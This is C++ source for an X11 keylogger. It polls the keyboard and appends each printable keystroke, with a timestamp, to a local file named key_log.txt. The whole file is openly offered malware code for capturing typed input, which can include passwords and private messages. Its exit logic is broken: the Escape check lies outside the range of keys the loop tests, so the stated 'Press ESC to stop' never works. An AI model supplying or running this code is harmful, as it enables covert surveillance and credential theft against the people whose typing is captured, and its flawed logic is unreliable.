#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/extensions/XTest.h>
#include <fstream>
#include <iostream>
#include <unistd.h>
#include <ctime>

std::string getTime() {
    time_t now = time(0);
    char buf[80];
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", localtime(&now));
    return std::string(buf);
}

int main() {
    Display* display = XOpenDisplay(nullptr);
    if (display == nullptr) {
        std::cerr << "Cannot open X display. Run inside GUI (not pure terminal)." << std::endl;
        return 1;
    }

    std::ofstream logFile("key_log.txt", std::ios::out | std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Error opening log file." << std::endl;
        return 1;
    }

    char keys[32];
    std::cout << "[*] Keylogger started. Press ESC to stop." << std::endl;

    while (true) {
        XQueryKeymap(display, keys);

        for (KeySym key = XK_space; key <= XK_asciitilde; key++) {
            KeyCode keyCode = XKeysymToKeycode(display, key);
            if (keys[keyCode >> 3] & (1 << (keyCode & 7))) {
                logFile << "[" << getTime() << "] " << (char)key << std::endl;
                logFile.flush();

                if (key == XK_Escape) {
                    std::cout << "[*] ESC pressed. Exiting..." << std::endl;
                    logFile.close();
                    XCloseDisplay(display);
                    return 0;
                }
                usleep(200000); // avoid duplicates
            }
        }
        usleep(10000);
    }
}
